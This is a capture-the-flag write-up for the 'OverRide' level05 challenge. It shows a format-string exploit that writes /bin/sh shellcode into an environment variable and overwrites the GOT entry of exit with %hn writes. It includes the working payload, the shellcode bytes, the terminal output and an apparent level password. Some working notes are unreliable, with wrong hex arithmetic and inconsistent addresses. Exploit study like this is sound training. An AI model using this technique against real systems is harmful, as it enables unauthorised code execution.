# Level 05

Once logged in, you will see a binary.

```
$ ssh 164.92.144.154 -p 4242 -l level05
	   ____                  ____  _     __
	  / __ \_   _____  _____/ __ \(_)___/ /__
	 / / / / | / / _ \/ ___/ /_/ / / __  / _ \
	/ /_/ /| |/ /  __/ /  / _, _/ / /_/ /  __/
	\____/ |___/\___/_/  /_/ |_/_/\__,_/\___/

                       Good luck & Have fun

   To start, ssh with level00/level00 on 164.92.144.154:4242
level05@164.92.144.154's password:

RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
level05@OverRide:~$ ls
level05
```

Okay, let's run the program.

```
level05@OverRide:~$ ./level05
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2level05@OverRide:~$
level05@OverRide:~$
aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2level05@OverRide:~$ ./level05
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
aa0aa1aa2aa3aa4aa5aa6aa7aa8aa9ab0ab1ab2ab3ab4ab5ab6ab7ab8ab9ac0ac1ac2ac3ac4ac5ac6ac7ac8ac9ad0ad1ad2level05@OverRide:~$
level05@OverRide:~$ ./level05
AAAAAAAAAAAAAaaaaaaaaaaaAAaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
level05@OverRide:~$
```

By looking at the execution result of the program, two things can be observed,
- the uppercase letters will be turned into lower case letters
- if the length of input is too long, the output will only print 99 characters

By looking at the decompiled source (or with GDB), the program uses `printf`, so there is a chance of us using a format string attack.

```
gdb-peda$ info functions
[...]
0x08048340  printf
0x08048340  printf@plt
0x08048350  fgets
0x08048350  fgets@plt
[...]
0x08048370  exit
0x08048370  exit@plt
[...]
```

`exit` is also called, and we can overrite the exit() in the GOT section (Global Offset Table). Let's find the GOT address of `exit`:

```
level05@OverRide:~$ objdump -R level05 | grep exit
080497e0 R_386_JUMP_SLOT   exit
```

We now have an address for `exit` (`0x080497e0`), and we need to provide a payload that contains a shellcode.

```
# our shellcode
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80

# store create payload that stores shellcode
export PAYLOAD=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
```

With the shellcode stored into the environment variable, a program can be written to access the address of the shellcode.

```
level05@OverRide:~$ cat /tmp/getenv.c
#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{
	printf("env address: %p\n", getenv(argv[1]));
	return (0);
}
level05@OverRide:~$ gcc -m32 /tmp/getenv.c -o /tmp/getenv  # NOTE: for 32bit
level05@OverRide:~$ export PAYLOAD=$(python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'")
level05@OverRide:/tmp$ ./getenv PAYLOAD
env address: 0xffffdf9f                                    # NOTE: will change per machine
### remember, the env. variable will change of the execution point, so let's run the program on different location ###
level05@OverRide:~$ /tmp/getenv PAYLOAD
0xffffdefd
```

We now have address we want to overwrite (`exit`: `0x080497e0`) and the data we want to write (`PAYLOAD`: `0xffffdefd`).

Unfortunately, `0xffffdefd` is quite large in decimal (`4294959007`), and it doesn't make sense to print that many characters in order to write the correct value with `printf`'s `%n` functionality. (Theoretically it would take approximately 7 minutes, but we'll count that as too long for our purposes.)

Instead, we'll write the number as two separate `printf` `%n` exploits by splitting the number into two `short`s instead of an `int`. Our exploit will be in the following format:

```
AAAABBBB                        %n                                   %n
    ^ Points to second short    ^ After [first short value] bytes    ^ After [second short value] bytes
^ Points to first short           Takes AAAA as "param"          Takes BBBB as "param"
```

XXX: ntoe use of `%57077u%10$hn`

Here's the process for splitting the `int` into two `short`s:

| Step                        | First `short`          | Second `short`                                                                          |
|-----------------------------|------------------------|-----------------------------------------------------------------------------------------|
| Breaking the number down    | `0xffffdf9f`<br>`^^^^` | `0xffffdf9f`<br>`------^^^^`                                                            |
| `short` value to write      | `0xffff`               | `0xdf9f`                                                                                |
| Flip endian-ness            | `                      |                                                                                         |
| Where we'll write to        | `0x080497e0`           | `0x080497e0` + 2 bytes = `0x080497e2`<br>We add 2 bytes because it's the second `short` |
| Argument offset (see below) | 10                     | 11                                                                                      |




We need to find where in memory our string is being stored in order to pass in our own input as "arguments" into `printf`. Let's find out the offset we need to pass into `printf`.

```
level05@OverRide:~$ echo "AAAABBBB %x %x %x %x %x %x %x %x %x %x %x %x" | ./level05
aaaabbbb 64 f7fcfac0 f7ec3af9 ffffd6ef ffffd6ee 0 ffffffff ffffd774 f7fdb000 61616161 62626262 20782520
```

So our two offsets are 10 and 11.





Because the address too big, we overwrite the target 2 bytes each time. (the first 4 bytes of address can be ignored)

for the first 2 bytes, we input the data `0xdefd - 0x8 = 0xebb5 (57077)` (because what the payload will prit out is 8 bytes=> XXXX that creates the offset of the printf already, and each address is 4 bytes XXXXXXX), then we overwrite the next two bytes `0xffff - 0xdefd = 0x2102 (8450)`

let's try out

```
level05@OverRide:~$ echo $(python -c 'from struct import pack; print(pack("I", 0x080497e0) + pack("I", 0x080497e2) + "%57077u%10$hn" + "%8450u%11$hn")') | ./level05
[...]
[...]
[...]
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
level05@OverRide:~$
```
